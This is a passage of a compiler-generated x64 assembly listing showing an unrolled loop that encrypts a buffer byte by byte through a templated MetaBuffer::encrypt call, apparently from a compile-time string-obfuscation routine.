  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	b8 01 00 00 00	 mov	 eax, 1
  00327	48 6b c0 12	 imul	 rax, rax, 18
  0032b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00332	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00336	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0033d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  00342	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00349	88 41 13	 mov	 BYTE PTR [rcx+19], al
  0034c	b8 01 00 00 00	 mov	 eax, 1
  00351	48 6b c0 13	 imul	 rax, rax, 19
  00355	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0035c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00360	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00367	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  0036c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00373	88 41 14	 mov	 BYTE PTR [rcx+20], al
  00376	b8 01 00 00 00	 mov	 eax, 1
  0037b	48 6b c0 14	 imul	 rax, rax, 20
  0037f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00386	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0038a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00391	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  00396	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0039d	88 41 15	 mov	 BYTE PTR [rcx+21], al
  003a0	b8 01 00 00 00	 mov	 eax, 1
  003a5	48 6b c0 15	 imul	 rax, rax, 21
  003a9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003b0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003bb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  003c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003c7	88 41 16	 mov	 BYTE PTR [rcx+22], al
  003ca	b8 01 00 00 00	 mov	 eax, 1
  003cf	48 6b c0 16	 imul	 rax, rax, 22
  003d3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003da	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003e5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  003ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003f1	88 41 17	 mov	 BYTE PTR [rcx+23], al
  003f4	b8 01 00 00 00	 mov	 eax, 1
  003f9	48 6b c0 17	 imul	 rax, rax, 23
  003fd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00404	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00408	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0040f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  00414	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0041b	88 41 18	 mov	 BYTE PTR [rcx+24], al
  0041e	b8 01 00 00 00	 mov	 eax, 1
  00423	48 6b c0 18	 imul	 rax, rax, 24
  00427	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0042e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00432	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00439	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  0043e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00445	88 41 19	 mov	 BYTE PTR [rcx+25], al
  00448	b8 01 00 00 00	 mov	 eax, 1
  0044d	48 6b c0 19	 imul	 rax, rax, 25
  00451	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00458	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0045c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00463	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  00468	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0046f	88 41 1a	 mov	 BYTE PTR [rcx+26], al
  00472	b8 01 00 00 00	 mov	 eax, 1
  00477	48 6b c0 1a	 imul	 rax, rax, 26
  0047b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00482	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00486	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0048d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  00492	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00499	88 41 1b	 mov	 BYTE PTR [rcx+27], al
  0049c	b8 01 00 00 00	 mov	 eax, 1
  004a1	48 6b c0 1b	 imul	 rax, rax, 27
  004a5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004ac	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004b7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  004bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004c3	88 41 1c	 mov	 BYTE PTR [rcx+28], al
  004c6	b8 01 00 00 00	 mov	 eax, 1
  004cb	48 6b c0 1c	 imul	 rax, rax, 28
  004cf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004d6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004e1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  004e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004ed	88 41 1d	 mov	 BYTE PTR [rcx+29], al
  004f0	b8 01 00 00 00	 mov	 eax, 1
  004f5	48 6b c0 1d	 imul	 rax, rax, 29
  004f9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00500	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00504	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0050b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  00510	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00517	88 41 1e	 mov	 BYTE PTR [rcx+30], al
  0051a	b8 01 00 00 00	 mov	 eax, 1
  0051f	48 6b c0 1e	 imul	 rax, rax, 30
  00523	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0052a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0052e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00535	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  0053a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00541	88 41 1f	 mov	 BYTE PTR [rcx+31], al
  00544	b8 01 00 00 00	 mov	 eax, 1
  00549	48 6b c0 1f	 imul	 rax, rax, 31
  0054d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00554	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00558	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
